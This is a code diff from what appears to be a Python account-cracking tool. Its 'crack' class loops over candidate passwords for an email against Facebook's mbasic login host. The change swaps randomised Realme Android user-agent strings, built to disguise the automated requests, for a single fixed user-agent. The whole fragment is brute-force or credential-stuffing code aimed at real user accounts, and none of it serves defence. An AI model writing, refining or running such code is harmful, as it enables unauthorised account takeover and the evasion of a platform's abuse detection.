@@ -290,8 +290,7 @@ class crack:
     def main(self, total, email, password):
         try:
 	      for pws in password:
-		ua = random.choice(ugen)
-		#self.useragent = self.realme_useragent(total = 1)
+		self.useragent = self.realme_useragent(total = 1)
                     with requests.Session() as r:
 			r.headers.update({
 			    'host': 'mbasic.facebook.com',
@@ -387,11 +386,7 @@ class crack:
     ### REALME USERAGENT ###
     def realme_useragent(self, total):
         for _ in range(total):
-            self.browser_version = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
-            self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
-            self.android_version = random.choice(['11', '10'])
-            self.android_model = random.choice(['RMX2052', 'RMX2072', 'RMX2075', 'RMX2071', 'RMX2076', 'RMX2144'])
-            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.build, self.browser_version))
+            self.useragent = ('Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36')
         return self.useragent
 
 def ua():
